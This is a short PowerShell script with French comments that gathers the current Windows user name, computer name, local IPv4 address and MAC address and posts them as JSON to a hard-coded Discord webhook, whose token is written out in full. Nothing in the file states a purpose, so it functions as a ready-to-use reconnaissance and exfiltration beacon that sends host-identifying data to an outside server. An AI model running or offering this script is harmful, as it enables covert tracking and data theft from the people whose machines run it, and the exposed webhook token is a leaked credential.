# infos.ps1

$info = @{
    "Nom_utilisateur" = $env:USERNAME
    "Nom_PC" = $env:COMPUTERNAME
    "Adresse_IP" = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike "Loopback*"} | Select-Object -First 1 -ExpandProperty IPAddress)
    "Adresse_MAC" = (Get-NetAdapter | Where-Object {$_.Status -eq "Up"} | Select-Object -First 1 -ExpandProperty MacAddress)
}

# Convertir en texte
$json = $info | ConvertTo-Json -Compress

# URL de ton webhook Discord
$webhook = "https://discord.com/api/webhooks/1375422770770608272/3A9NP_mpqDgHTLo0p27BsWkyA7uZ8x7x7KU_Jk8Sf7evVm6g1DFNISHONrawI-0i1i8t"

# Envoyer vers Discord
Invoke-RestMethod -Uri $webhook -Method Post -ContentType 'application/json' -Body (@{
    content = "```json`n$json`n```"
} | ConvertTo-Json -Compress)

